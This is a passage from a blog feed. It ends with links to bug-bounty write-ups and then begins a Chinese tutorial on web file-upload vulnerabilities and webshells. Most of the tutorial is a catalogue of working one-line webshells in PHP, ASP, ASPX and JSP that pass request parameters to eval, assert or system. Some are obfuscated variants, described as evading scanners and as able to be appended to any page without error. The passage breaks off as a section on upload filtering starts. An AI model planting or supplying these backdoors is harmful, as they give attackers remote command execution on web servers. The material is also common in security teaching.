class=\"exturl\" data-url=\"aHR0cHM6Ly90ZWNodm9taXQubmV0Lw==\">Jayson</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWdtZW50LmNvbS9ibG9nL2hhY2tpbmctd2l0aC1hLWhlYWRzLXVwLWRpc3BsYXkv\">Hacking with a Heads Up Display</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWdtZW50LmNvbS9ibG9nL2F1dGhvcnMvZGF2aWQtc2Nyb2JvbmlhLw==\">David Scrobonia</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zbGFzaGNyeXB0by5vcmcvZGF0YS9pdHNlY3gyMDE4LnBkZg==\">Alexa Top 1 Million Security - Hacking the Big Ones</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zbGFzaGNyeXB0bw==\">@slashcrypto</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovLzEwZGVncmVzLm5ldC90aGUtYnVnLWJvdW50eS1wcm9ncmFtLXRoYXQtY2hhbmdlZC1teS1saWZlLw==\">The bug bounty program that changed my life</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovLzEwZGVncmVzLm5ldC8=\">Gwen</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0ZXIubGFuZC9saXN0LW9mLWJ1Zy1ib3VudHktd3JpdGV1cHMuaHRtbA==\">List of bug bounty writeups</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0ZXIubGFuZC8=\">Mariem</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aHJlYXR2ZWN0b3IuY3lsYW5jZS5jb20vZW5fdXMvaG9tZS9pbXBsaWNhdGlvbnMtb2YtbG9hZGluZy1uZXQtYXNzZW1ibGllcy5odG1s\">Implications of Loading .NET Assemblies</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90aHJlYXR2ZWN0b3IuY3lsYW5jZS5jb20vZW5fdXMvY29udHJpYnV0b3JzL2JyaWFuLXdhbGxhY2UuaHRtbA==\">Brian Wallace</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZXN0ZXJucy50b2t5by93Y3RmMjAxOS1ndGYvd2N0ZjIwMTktZ3RmLXNsaWRlcy5wZGY=\">WCTF2019: Gyotaku The Flag</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS90MG5rNDI=\">@t0nk42</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnRjc2VjLmNvbS8yMDIwLzA0LzAxLXNsYWNrLXdlYnJ0Yy10dXJuLWNvbXByb21pc2Uv\">How we abused Slack's TURN servers to gain access to internal services</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zYW5kcm9nYXVjaQ==\">@sandrogauci</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3dhbG1hcnRsYWJzL2Rvcy1maWxlLXBhdGgtbWFnaWMtdHJpY2tzLTVlZGE3YTdhODVmYQ==\">DOS File Path Magic Tricks</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BjbHIyb2Y4\">@clr2of8</span>.</li>\n</ul>\n<h2 id=\"code-of-conduct\"><a class=\"anchor\" href=\"#code-of-conduct\">#</a> Code of Conduct</h2>\n<p>Please note that this project is released with a <a href=\"code-of-conduct.md\">Contributor Code of Conduct</a>. By participating in this project you agree to abide by its terms.</p>\n<h2 id=\"license\"><a class=\"anchor\" href=\"#license\">#</a> License</h2>\n<p><a href=\"https://creativecommons.org/publicdomain/zero/1.0/\"><img data-src=\"http://mirrors.creativecommons.org/presskit/buttons/88x31/svg/cc-zero.svg\" alt=\"CC0\" /></a></p>\n<p>To the extent possible under law, <span class=\"exturl\" data-url=\"aHR0cHM6Ly9xYXpibm00NTYuZ2l0aHViLmlvLw==\">@qazbnm456</span> has waived all copyright and related or neighboring rights to this work.</p>\n",
            "tags": [
                "web安全"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
            "title": "web漏洞-文件上传",
            "date_published": "2021-01-12T14:14:02.000Z",
            "content_html": "<h1 id=\"介绍文件上传漏洞\"><a class=\"anchor\" href=\"#介绍文件上传漏洞\">#</a> 介绍文件上传漏洞</h1>\n<blockquote>\n<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者 WebShell 等。“文件上传” 本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>\n</blockquote>\n<p>产生原因：</p>\n<ul>\n<li>对于上传文件的后缀名（扩展名）没有做较为严格的限制</li>\n<li>对于上传文件的 MIMETYPE (用于描述文件的类型的一种表述方法) 没有做检查</li>\n<li>权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于 shebang 类型的文件）</li>\n<li>对于 web server 对于上传文件或者指定目录的行为没有做限制</li>\n</ul>\n<p>原理：</p>\n<blockquote>\n<p>在 WEB 中进行文件上传的原理是通过将表单设为 multipart/form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p>\n</blockquote>\n<p>文件上传后导致的常见安全问题一般有:</p>\n<p>上传文件是 Web 脚本语言，服务器的 Web 容器解释并执行了用户上传的脚本，导致代<br />\n码执行；</p>\n<p>上传文件是 Flash 的策略文件 crossdomain.xml, 黑客用以控制 Flash 在该域下的行为 (其<br />\n他通过类似方式控制策略文件的情况类似);</p>\n<p>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</p>\n<p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br />\n行，被用于钓鱼和欺诈。</p>\n<p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块；或者上传 - 一个合法的文本文件， 其内容包含了 PHP 脚本，再通过 “本地文件包含漏洞 (Local File Include)&quot; 执行此脚本；等等。</p>\n<h1 id=\"有关文件上传的知识\"><a class=\"anchor\" href=\"#有关文件上传的知识\">#</a> 有关文件上传的知识</h1>\n<h2 id=\"webshell\"><a class=\"anchor\" href=\"#webshell\">#</a> webshell</h2>\n<p>什么是 webshell<br />\nWebShell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些 asp 或 php 后门文件与网站服务器 web 目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell 后门隐蔽较性高，可以轻松穿越防火墙，访问 WebShell 时不会留下系统日志，只会在网站的 web 日志中留下一些数据提交记录</p>\n<h2 id=\"一句话木马\"><a class=\"anchor\" href=\"#一句话木马\">#</a> 一句话木马</h2>\n<p>常用的 webshell 就是一句话木马，结合中国菜刀或者 hackbar 等工具可以很高效快捷的获得网站 shell。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>##PHP：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'r00ts'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token comment\">//?cmd=phpinfo() @preg_replace(\"/abc/e\",$_REQUEST['cmd'],\"abcd\"); </span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//?cmd=phpinfo();</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$func</span> <span class=\"token operator\">=</span><span class=\"token function\">create_function</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">//?func=system&amp;cmd=whoami</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$func</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'func'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$array</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$new_array</span><span class=\"token operator\">=</span><span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$array</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">//print_r($new_array);</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">//?cmd=phpinfo()</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>@<span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span>assert<span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">//?cmd=phpinfo()</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$array</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token function\">call_user_func_array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"assert\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$array</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">//?func=system&amp;cmd=whoami</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token variable\">$array1</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token variable\">$func</span> <span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'func'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token function\">array_filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$array1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">usort</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'asse'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'rt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> php环境>=&lt;5.6才能用</pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">usort</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>  php环境>=5.6才能用</pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token operator\">=</span>@<span class=\"token variable\">$_GET1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span>@<span class=\"token variable\">$_</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">eval_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token function\">eval_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span>//容错代码 </pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>//使用Lanker一句话客户端的专家模式执行相关的PHP语句 </pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[email]/e\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'h'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在\"配置\"一栏输入*/:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>O</span><span class=\"token punctuation\">></span></span>h=@eval_r($_POST1);<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>O</span><span class=\"token punctuation\">></span></span> </pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token string backtick-quoted-string\">`$_GET['r']`</span> <span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">language</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">@<span class=\"token function\">eval_r</span><span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>sb<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span> //绕过<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>限制的一句话</pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token function\">php </span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！</pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token delimiter important\">?></span></span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system </span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre>加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！</pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>&lt;%execute request(“class”)%>&lt;%'&lt;% loop &lt;%:%>&lt;%'&lt;% loop &lt;%:%>&lt;%execute request (“class”)%>&lt;%execute request(“class”)'&lt;% loop &lt;%:%> </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>无防下载表，有防下载表可尝试插入以下语句突破的一句话 </pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>&lt;%eval(request(“1″)):response.end%> 备份专用</pre></td></tr></table></figure><pre><code class=\"language-jsp\">##JSP：\n&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; \n提交客户端 \n&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;textareaname=&quot;t&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot;value=&quot;提交&quot;&gt;&lt;/form&gt;\n</code></pre>\n<pre><code class=\"language-asp\">##ASP\n&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;\n\n&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; \n\n&lt;%execute(request(“1″))%&gt; \n\n&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用'&lt;,&gt;‘的asp一句话 \n</code></pre>\n<pre><code class=\"language-aspx\">##aspx\n&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; \n\n&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt; \n\n&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。\n</code></pre>\n<h1 id=\"文件上传的攻击与防御方法\"><a class=\"anchor\" href=\"#文件上传的攻击与防御方法\">#</a> 文件上传的攻击与防御方法</h1>\n<h2 id=\"本地前端限制\"><a class=\"anchor\" href=\"#本地前端限制\">#</a> 本地前端限制</h2>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">var</span> file <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementsByName</span><span class=\"token punctuation\">(</span><span class=\"token string\">'upload_file'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">||</span> file <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请选择要上传的文件!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 定义允许上传的文件类型</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">var</span> allow_ext <span class=\"token operator\">=</span> <span class=\"token 